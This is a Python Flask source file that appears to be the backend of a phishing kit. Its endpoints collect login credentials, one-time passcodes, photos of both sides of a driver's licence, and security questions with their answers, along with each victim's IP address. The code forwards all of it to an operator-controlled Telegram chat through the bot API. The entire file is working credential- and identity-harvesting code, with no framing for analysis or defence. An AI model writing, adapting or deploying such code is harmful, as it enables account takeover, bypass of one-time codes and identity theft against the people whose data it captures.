from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv

# Load environment variables from .env file (for local testing)
load_dotenv()

app = Flask(__name__)

# Configure CORS to allow requests from Vercel domain
CORS(app, resources={r"/*": {"origins": "*"}})  # Update with your Vercel domain after deployment

# Telegram Bot Token and Chat ID from environment variables
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

@app.route('/submit', methods=['POST'])
def submit_form():
    # Extract form data
    username = request.form.get('username')
    password = request.form.get('password')
    # Get user IP address (handle proxies with X-Forwarded-For)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    if not username or not password:
        return jsonify({"error": "Missing username or password"}), 400

    # Format message for Telegram
    message = f"🔐 LOGIN Submission\nLogin Id: {username}\nPassword: {password}\nuser Ip: {user_ip}"

    # Send data to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message
            },
            timeout=5
        )
        response.raise_for_status()
        return jsonify({"status": "success", "message": "Data sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

@app.route('/submit-otp', methods=['POST'])
def submit_otp():
    # Extract OTP data
    otp = request.form.get('otp')
    # Get user IP address (handle proxies with X-Forwarded-For)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    if not otp:
        return jsonify({"error": "Missing OTP"}), 400

    # Format message for Telegram
    message = f"🔐 OTP Submission\nOTP: {otp}\nuser Ip: {user_ip}"

    # Send data to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message
            },
            timeout=5
        )
        response.raise_for_status()
        return jsonify({"status": "success", "message": "OTP sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

@app.route('/submit-images', methods=['POST'])
def submit_images():
    # Extract image files and user IP
    image1 = request.files.get('image')
    image2 = request.files.get('image2')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    if not image1 or not image2:
        return jsonify({"error": "Missing one or both images"}), 400

    # Format message for Telegram
    message = f"🔐 Image Submission\nImages: Driver License Front and Back\nuser Ip: {user_ip}"

    # Send text message to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message
            },
            timeout=5
        )
        response.raise_for_status()

        # Send images to Telegram using sendPhoto
        telegram_photo_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        for img in [image1, image2]:
            img.seek(0)  # Reset file pointer
            response = requests.post(
                telegram_photo_url,
                data={"chat_id": TELEGRAM_CHAT_ID},
                files={"photo": (img.filename, img, img.mimetype)},
                timeout=5
            )
            response.raise_for_status()

        return jsonify({"status": "success", "message": "Images sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

@app.route('/submit-security', methods=['POST'])
def submit_security():
    # Extract form data
    sec_q_1 = request.form.get('sec_q_1')
    sec_q_11 = request.form.get('sec_q_11')
    sec_a_1 = request.form.get('sec_a_1')
    sec_q_2 = request.form.get('sec_q_2')
    sec_q_22 = request.form.get('sec_q_22')
    sec_a_2 = request.form.get('sec_a_2')
    sec_q_3 = request.form.get('sec_q_3')
    sec_q_33 = request.form.get('sec_q_33')
    sec_a_3 = request.form.get('sec_a_3')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Validate inputs
    if sec_q_1 == "0" or not sec_a_1 or (sec_q_1 == "x" and not sec_q_11):
        return jsonify({"error": "Missing or invalid input for Security Question 1"}), 400
    if sec_q_2 == "0" or not sec_a_2 or (sec_q_2 == "x" and not sec_q_22):
        return jsonify({"error": "Missing or invalid input for Security Question 2"}), 400
    if sec_q_3 == "0" or not sec_a_3 or (sec_q_3 == "x" and not sec_q_33):
        return jsonify({"error": "Missing or invalid input for Security Question 3"}), 400

    # Use custom questions if provided
    final_q_1 = sec_q_11 if sec_q_1 == "x" else sec_q_1
    final_q_2 = sec_q_22 if sec_q_2 == "x" else sec_q_2
    final_q_3 = sec_q_33 if sec_q_3 == "x" else sec_q_3

    # Format message for Telegram
    message = f"🔐 Security Questions Submission\nQuestion 1: {final_q_1}\nAnswer 1: {sec_a_1}\nQuestion 2: {final_q_2}\nAnswer 2: {sec_a_2}\nQuestion 3: {final_q_3}\nAnswer 3: {sec_a_3}\nuser Ip: {user_ip}"

    # Send data to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message
            },
            timeout=5
        )
        response.raise_for_status()
        return jsonify({"status": "success", "message": "Security questions sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
